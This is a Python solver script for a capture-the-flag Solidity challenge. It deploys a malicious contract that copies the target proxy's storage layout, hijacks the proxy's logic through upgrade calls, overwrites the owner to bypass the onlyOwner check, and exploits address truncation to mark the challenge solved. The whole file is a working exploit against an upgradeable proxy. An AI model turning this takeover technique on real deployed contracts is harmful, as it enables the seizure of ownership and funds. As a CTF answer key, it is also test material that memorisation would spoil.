#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pathlib import Path

from ctf_solvers.pwn_solver import PwnChallengeSolver
from ctf_solvers.types import ChallengeInstanceInfo

from cheb3 import Connection
from cheb3.utils import compile_sol, encode_with_signature
from cheb3.account import logger
import warnings


logger.remove()
warnings.filterwarnings('ignore')  # UnexpectedVersionWarning


single_sol = (Path(__file__).parent / 'single.sol').read_text()
single_sol += '''
contract SolverContract {
  // Have similar storage as the original contract
  struct Structure {
    uint8 x;
    uint16 y;
    bool z;
    uint24 a;
    bytes8 bt;
    uint32 b;
  }

  address public owner;
  Structure public str = Structure(1, 13, false, 37, "cafe", 10);
  address public logic;
  bool public cr3 = false;

  constructor(address _own, address _log) {
    owner = _own;
    logic = _log;
  }

  function FirstStep(bool boolVal) external returns(bool, address, bytes8) {
    // Only Change The Required parts of the struct
    str.z = boolVal;
    bytes8 toRet = "ffff";

    // Return what contract expects
    return(false, address(0), toRet);
  }

  // Bypass The onlyOwner Modifier By Changing the modifier
  function SecondStep(address _newOwner) external returns(address) {
    owner = _newOwner;

    return(owner);
  }

  // Address Truncation -> Craft the address to bytes32 here
  // When Returned, the proxy contract will decode it back to original address
  function FinalStep(address newOwner) external pure returns (bytes6, bytes32){
    bytes6  cr = "cr3";
    bytes32 retBytes32 = bytes32(uint256(uint160(newOwner)));

    return(cr, retBytes32);
  }
}'''


class Solver(PwnChallengeSolver):
    def _solve(self, data: ChallengeInstanceInfo):
        conn = Connection(data['http_endpoint'])
        acc = conn.account(data['private_key'])

        contracts = compile_sol(single_sol, solc_version='0.8.20')
        cr3_proxy_abi, cr3_proxy_bytecode = contracts['Cr3Proxy']
        logic_abi, logic_bytecode = contracts['Logic']
        solver_abi, solver_bytecode = contracts['SolverContract']

        cr3_proxy = conn.contract(signer=acc, address=data['contracts']['Cr3Proxy'],
                                  abi=cr3_proxy_abi, bytecode=cr3_proxy_bytecode)
        logic = conn.contract(signer=acc, address=data['contracts']['Logic'],
                              abi=logic_abi, bytecode=logic_bytecode)
        solver = conn.contract(signer=acc, abi=solver_abi, bytecode=solver_bytecode)

        if cr3_proxy.functions.isSolved().call():
            return

        deployer_address = ''
        for i in range(15):
            if len(deployer_address) > 0:
                break

            try:
                block = conn.w3.eth.get_block(i, full_transactions=True)
            except:  # noqa
                break

            for transaction in block['transactions']:
                deployer_address = transaction['from']
                break

        solver.deploy(deployer_address, logic.address)

        data = encode_with_signature('FirstStep(bool)', True)
        cr3_proxy.functions.update(data, solver.address).send_transaction()

        cr3_proxy.functions.upgrade(solver.address).send_transaction()

        data = encode_with_signature('SecondStep(address)', acc.address)
        cr3_proxy.functions.update(data, acc.address).send_transaction()

        data = encode_with_signature('FinalStep(address)', acc.address)
        cr3_proxy.functions.checkValid(data).send_transaction()


Solver().start()
